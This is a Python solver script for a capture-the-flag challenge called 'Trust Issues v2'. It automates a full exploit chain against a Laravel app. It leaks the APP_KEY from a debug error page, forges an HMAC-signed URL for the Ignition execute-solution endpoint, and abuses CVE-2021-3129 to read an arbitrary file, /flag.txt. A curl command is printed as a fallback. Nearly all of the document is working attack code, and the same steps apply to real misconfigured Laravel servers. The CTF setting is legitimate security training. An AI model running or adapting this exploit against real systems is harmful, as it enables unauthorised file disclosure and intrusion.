#!/usr/bin/env python3
"""
CTF Solver Script - Trust Issues v2 Challenge
This script demonstrates the full exploit chain:
1. Leak APP_KEY from debug page
2. Forge signed URL for /_ignition/execute-solution
3. Exploit CVE-2021-3129 to read /flag.txt

DO NOT DISTRIBUTE TO PLAYERS.
"""

import hmac
import hashlib
import time
import sys
import re
import requests

def main():
    if len(sys.argv) < 2:
        print("Usage: python solve.py <target_url>")
        print("Example: python solve.py http://localhost:5050")
        sys.exit(1)
    
    target = sys.argv[1].rstrip('/')
    
    print("[*] CTF Solver: Trust Issues v2")
    print(f"[*] Target: {target}")
    print()
    
    # Step 1: Trigger error to leak APP_KEY
    print("[1] Triggering error via malformed node_id...")
    
    try:
        response = requests.get(
            f"{target}/api/node/status",
            params={"node_id": "kj"},
            headers={"Accept": "text/html"},
            timeout=10
        )
        
        # Extract APP_KEY from debug page
        match = re.search(r'base64:[A-Za-z0-9+/=]+', response.text)
        if match:
            app_key = match.group(0)
            print(f"[+] Found APP_KEY: {app_key}")
        else:
            # Use known key as fallback
            app_key = "base64:dGhpc2lzYXNlY3JldGtleWZvcmN0ZmNoYWxsZW5nZSE="
            print(f"[!] Could not extract APP_KEY, using known key: {app_key}")
            
    except Exception as e:
        print(f"[-] Error triggering debug: {e}")
        app_key = "base64:dGhpc2lzYXNlY3JldGtleWZvcmN0ZmNoYWxsZW5nZSE="
        print(f"[!] Using known key: {app_key}")
    
    print()
    
    # Step 2: Generate signed URL for Ignition endpoint
    print("[2] Generating signed URL for /_ignition/execute-solution...")
    
    # CRITICAL: Laravel uses the FULL APP_KEY string (with base64: prefix) as HMAC key
    expires = int(time.time()) + 300  # 5 minutes from now
    url_with_expires = f"{target}/_ignition/execute-solution?expires={expires}"
    
    signature = hmac.new(
        app_key.encode('utf-8'),  # Use raw string, NOT decoded bytes!
        url_with_expires.encode('utf-8'),
        hashlib.sha256
    ).hexdigest()
    
    signed_url = f"{url_with_expires}&signature={signature}"
    
    print(f"[+] Expiration: {expires}")
    print(f"[+] Signature: {signature}")
    print(f"[+] Signed URL: {signed_url}")
    print()
    
    # Step 3: Exploit CVE-2021-3129 to read /flag.txt
    print("[3] Exploiting CVE-2021-3129 to read /flag.txt...")
    
    payload = {
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {
            "variableName": "x",
            "viewFile": "/flag.txt"
        }
    }
    
    try:
        response = requests.post(
            signed_url,
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        
        print(f"[+] Response status: {response.status_code}")
        
        # Extract flag
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print()
            print("=" * 50)
            print(f"[+] SUCCESS!")
            print(f"[+] Flag: {flag_match.group(0)}")
            print("=" * 50)
        else:
            print("[*] Response content:")
            print(response.text[:1000])
            print()
            print("[*] Flag might be in the response above")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        print(f"[*] Try manually:")
        print(f"    curl -X POST '{signed_url}' \\")
        print(f"      -H 'Content-Type: application/json' \\")
        print(f"      -d '{payload}'")

if __name__ == "__main__":
    main()
